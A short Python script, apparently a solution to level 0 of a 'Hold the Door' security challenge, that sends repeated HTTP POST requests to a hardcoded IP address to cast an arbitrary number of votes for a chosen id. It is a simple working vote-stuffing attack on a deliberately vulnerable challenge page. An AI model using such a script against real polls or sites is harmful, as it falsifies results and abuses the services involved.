#!/usr/bin/python3

"""
This is my solution to the Hold the Door Challenge - Level 0
This script will cast an aritrary number of votes for an arbitrary id.
Just change `eyed` and `votes` to the id and number of votes you want to sumbit
"""
import requests

eyed = 247
votes = 124

url = 'http://158.69.76.135/level0.php'
payload = {'id': eyed, 'holdthedoor': 'Submit'}
while votes >= 0:
    r = requests.post(url, payload)
    votes -= 1
